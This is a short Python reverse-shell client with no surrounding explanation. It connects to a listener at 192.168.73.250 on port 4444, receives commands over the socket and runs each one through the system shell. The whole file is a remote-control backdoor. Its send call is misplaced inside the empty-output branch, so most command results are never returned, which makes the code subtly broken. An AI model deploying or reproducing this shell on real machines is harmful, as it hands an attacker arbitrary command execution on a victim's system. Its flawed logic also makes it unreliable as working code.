import sys
import socket
import subprocess

SERVER_IP="192.168.73.250"
PORT = 4444

s = socket.socket()
s.connect((SERVER_IP,PORT))
msg = s.recv(1024).decode()
print(f'[*] Server : {msg}')

while True:
    cmd = s.recv(1024).decode()
    print(f'[+] received command : {cmd}')
    if cmd.lower() in ['quit','q','exit','x']:
        break
    try:
        result = subprocess.check_output(cmd,stderr=subprocess.STDOUT, shell=True)
    except Exception as e:
        result = str(e).encode()

    if len(result) == 0:
        result = '[+] Executed Sucessfully '.encode()
        s.send(result)

s.close()